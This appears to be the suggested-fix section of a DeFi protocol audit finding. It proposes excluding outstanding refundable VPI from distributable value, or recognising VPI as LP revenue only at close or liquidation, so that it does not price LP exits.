## Suggested fix

Do not let refundable VPI price LP exits.

- When reconciling for LP epoch pricing, subtract outstanding refundable VPI from distributable value: the sum of positive `vpiAccrued` over open positions, which bounds every future close rebate under the lifetime clamp. Maintain it as a running sum next to the terminal book, as negative VPI already has a dedicated reserve, and release it to LPs when a position closes or is liquidated without consuming it.
- Alternatively, recognise a VPI charge as LP revenue only when it can no longer be rebated: at close or liquidation, for the net lifetime VPI.

Either keeps the intended VPI economics: net VPI revenue still reaches LPs and the lifetime clamp still applies.

